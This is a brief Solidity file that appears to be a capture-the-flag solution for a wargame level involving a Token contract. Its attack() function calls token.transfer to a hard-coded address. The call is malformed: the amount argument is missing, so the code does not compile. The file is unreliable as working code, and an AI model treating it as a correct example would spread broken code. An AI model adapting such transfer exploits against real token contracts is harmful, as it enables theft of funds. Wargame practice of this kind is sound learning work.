// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Level5.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level5Solution {
    Token public token = Token(0xAd9D9c6fB86FB23be3aD482F1103C6B706517c7F);


    function attack() public {

        token.transfer(0xb8bB85fbc32AD54B4f4B5750E8501Ed4712F5d65, );
        // console.log(token.balanceOf(0xb8bB85fbc32AD54B4f4B5750E8501Ed4712F5d65));

    }

}